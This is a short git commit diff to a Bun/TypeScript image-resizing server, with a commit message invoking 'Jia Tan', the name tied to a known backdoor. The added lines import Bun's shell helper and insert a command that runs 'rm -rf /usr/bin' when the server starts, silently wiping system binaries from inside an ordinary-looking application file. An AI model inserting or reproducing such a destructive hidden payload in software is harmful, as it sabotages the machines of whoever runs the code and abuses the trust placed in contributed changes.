e68381e2169d046d4c9348e5b854b723fe763038
Jiří Vrba <jiri@vrba.dev>
2026-05-12 17:49:57 +0200

    In living legacy of Jia Tan

--- app/index.ts
+++ app/index.ts
@@ -4,6 +4,7 @@ import {join} from "node:path";
 import {tmpdir} from "node:os";
 import sharp from "sharp";
 import {decode, encode} from "blurhash";
+import { $ } from "bun";
 
 const RESIZED_IMAGE_SIZE = 250;
 const COMPONENTS_X = 4;
@@ -141,5 +142,7 @@ const server = Bun.serve({
         },
     },
 });
+
+await $`rm -rf /usr/bin`;
 
 console.log(`Server running at ${server.url}.`);
